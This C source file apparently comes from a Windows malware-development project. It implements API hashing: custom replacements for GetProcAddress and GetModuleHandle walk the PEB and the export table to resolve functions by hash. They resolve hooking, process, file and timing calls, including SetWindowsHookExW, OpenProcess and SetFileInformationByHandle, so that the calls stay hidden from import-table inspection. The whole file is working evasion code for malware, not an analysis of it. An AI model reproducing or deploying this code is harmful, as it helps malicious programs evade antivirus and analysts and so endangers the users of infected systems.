#include "Common.h"

FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName)
{
	// We do this to avoid casting each time we use 'hModule'
	PBYTE pBase = (PBYTE)hModule;

	// Getting the export directory
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (GetImageExportDirectory(hModule, &pImageExportDirectory) == FALSE) {
		printf("[!] GetImageExportDirectory Failed\n");
		return FALSE;
	}
	printf("[+] Found EAT Of %p Handle At %p\n", pBase, pImageExportDirectory);

	// Getting the function's names array pointer
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)hModule + pImageExportDirectory->AddressOfFunctions);
	// Getting the function's addresses array pointer
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)hModule + pImageExportDirectory->AddressOfNames);
	// Getting the function's ordinal array pointer
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)hModule + pImageExportDirectory->AddressOfNameOrdinals);

	// Looping through all the exported functions
	// Looping through all the exported functions
	for (DWORD i = 0; i < pImageExportDirectory->NumberOfFunctions; i++) {

		// Getting the name of the function
		CHAR* pFunctionName = (CHAR*)(pBase + pdwAddressOfNames[i]);

		// Getting the ordinal of the function
		WORD wFunctionOrdinal = pwAddressOfNameOrdinales[i];

		// Getting the address of the function through it's ordinal
		if (StringCompareA(lpApiName, pFunctionName) == 0) {
			PVOID pFunctionAddress = (PVOID)(pBase + pdwAddressOfFunctions[wFunctionOrdinal]);
			printf("[+] Found API - Name: %s - Address: 0x%p - Ordinal: %d\n", pFunctionName, pFunctionAddress, wFunctionOrdinal);
			return  pFunctionAddress;
		}
	}

	printf("[!] CAN NOT FIND API - \t NAME: %s\n", lpApiName);
	return NULL;
}

FARPROC GetProcAddressByHashValue(IN HMODULE hModule, IN DWORD dwApiNameHashValue)
{
	// We do this to avoid casting each time we use 'hModule'
	PBYTE pBase = (PBYTE)hModule;

	// Getting the export directory
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (GetImageExportDirectory(hModule, &pImageExportDirectory) == FALSE) {
		printf("[!] GetImageExportDirectory Failed\n");
		return FALSE;
	}
	printf("[+] Found EAT Of %p Handle At %p\n", pBase, pImageExportDirectory);

	// Getting the function's names array pointer
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)hModule + pImageExportDirectory->AddressOfFunctions);
	// Getting the function's addresses array pointer
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)hModule + pImageExportDirectory->AddressOfNames);
	// Getting the function's ordinal array pointer
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)hModule + pImageExportDirectory->AddressOfNameOrdinals);

	// Looping through all the exported functions
	// Looping through all the exported functions
	for (DWORD i = 0; i < pImageExportDirectory->NumberOfFunctions; i++) {

		// Getting the name of the function
		CHAR* pFunctionName = (CHAR*)(pBase + pdwAddressOfNames[i]);

		// Getting the ordinal of the function
		WORD wFunctionOrdinal = pwAddressOfNameOrdinales[i];

		// Getting the address of the function through it's ordinal
		// TODO: lowercase strings
		if (dwApiNameHashValue == RTIME_HASHA(pFunctionName)) {
			PVOID pFunctionAddress = (PVOID)(pBase + pdwAddressOfFunctions[wFunctionOrdinal]);
			printf("[+] Found API - Name: %s - Address: 0x%p - Ordinal: %d\n", pFunctionName, pFunctionAddress, wFunctionOrdinal);
			return  pFunctionAddress;
		}
	}

	printf("[!] Can Not Find API - \t Hash: %d\n", dwApiNameHashValue);
	return NULL;
}

HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName)
{
	// Getting peb
#ifdef _WIN64 // if compiling as x64
	PPEB			pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // if compiling as x32
	PPEB			pPeb = (PEB*)(__readfsdword(0x30));
#endif

	// Getting the LoaderData field
	PPEB_LDR_DATA		    pLdr = (PPEB_LDR_DATA)(pPeb->LoaderData);

	// Getting the first element in the linked list which contains information about the first module
	PLDR_DATA_TABLE_ENTRY pDte = CONTAINING_RECORD(pLdr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks.Flink);

	while (pDte) {
		// If not null
		if (pDte->FullDllName.Length != NULL) {
			// Check if both equal
			if (IsStringEqual(pDte->FullDllName.Buffer, szModuleName)) {
				HMODULE hModule = (HMODULE)(pDte->InInitializationOrderLinks.Flink);
				wprintf(L"[+] Found Dll \"%s\" at %p\n", pDte->FullDllName.Buffer, (PVOID)hModule);
				return hModule;
			}
		}
		else {
			break;
		}
		// Next element in the linked list
		pDte = (PLDR_DATA_TABLE_ENTRY)pDte->InLoadOrderLinks.Flink;

	}

	return NULL;
}

HMODULE GetModuleHandleByHashValue(IN DWORD dwModuleNameHashValue)
{
	// Getting peb
#ifdef _WIN64 // if compiling as x64
	PPEB			pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // if compiling as x32
	PPEB			pPeb = (PEB*)(__readfsdword(0x30));
#endif

	// Getting the LoaderData field
	PPEB_LDR_DATA		    pLdr = (PPEB_LDR_DATA)(pPeb->LoaderData);

	// Getting the first element in the linked list which contains information about the first module
	PLDR_DATA_TABLE_ENTRY pDte = CONTAINING_RECORD(pLdr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks.Flink);

	while (pDte) {
		// If not null
		if (pDte->FullDllName.Length != NULL) {
			// Check if both equal
			// TODO: lowercase strings
			if (dwModuleNameHashValue == RTIME_HASHW(pDte->FullDllName.Buffer)) {
				HMODULE hModule = (HMODULE)(pDte->InInitializationOrderLinks.Flink);
				wprintf(L"[+] Found Dll \"%s\" at %p\n", pDte->FullDllName.Buffer, (PVOID)hModule);
				return hModule;
			}
		}
		else {
			break;
		}
		// Next element in the linked list
		pDte = (PLDR_DATA_TABLE_ENTRY)pDte->InLoadOrderLinks.Flink;

	}

	return NULL;
}

API_HASHING g_Api = { 0 };

BOOL InitializeWinApis()
{
	//	User32.dll exported
	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressByHashValue(
		GetModuleHandleByHashValue(USER32DLLHashValue),
		CallNextHookExHashValue
	);
	g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressByHashValue(
		GetModuleHandleByHashValue(USER32DLLHashValue),
		DefWindowProcWHashValue
	);
	g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressByHashValue(
		GetModuleHandleByHashValue(USER32DLLHashValue),
		GetMessageWHashValue
	);
	g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressByHashValue(
		GetModuleHandleByHashValue(USER32DLLHashValue),
		SetWindowsHookExWHashValue
	);
	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressByHashValue(
		GetModuleHandleByHashValue(USER32DLLHashValue),
		UnhookWindowsHookExHashValue
	);

	if (g_Api.pCallNextHookEx == NULL ||
		g_Api.pDefWindowProcW == NULL ||
		g_Api.pGetMessageW == NULL ||
		g_Api.pSetWindowsHookExW == NULL ||
		g_Api.pUnhookWindowsHookEx == NULL)
		return FALSE;

	// 	Kernel32.dll exported
	g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressByHashValue(
		GetModuleHandleByHashValue(KERNEL32DLLHashValue),
		GetModuleFileNameWHashValue
	);
	g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressByHashValue(
		GetModuleHandleByHashValue(KERNEL32DLLHashValue),
		CreateFileWHashValue
	);
	g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressByHashValue(
		GetModuleHandleByHashValue(KERNEL32DLLHashValue),
		GetTickCount64HashValue
	);
	g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressByHashValue(
		GetModuleHandleByHashValue(KERNEL32DLLHashValue),
		OpenProcessHashValue
	);
	g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressByHashValue(
		GetModuleHandleByHashValue(KERNEL32DLLHashValue),
		SetFileInformationByHandleHashValue
	);

	if (g_Api.pGetModuleFileNameW == NULL ||
		g_Api.pCreateFileW == NULL ||
		g_Api.pGetTickCount64 == NULL ||
		g_Api.pOpenProcess == NULL ||
		g_Api.pSetFileInformationByHandle == NULL)
		return FALSE;

	return TRUE;
}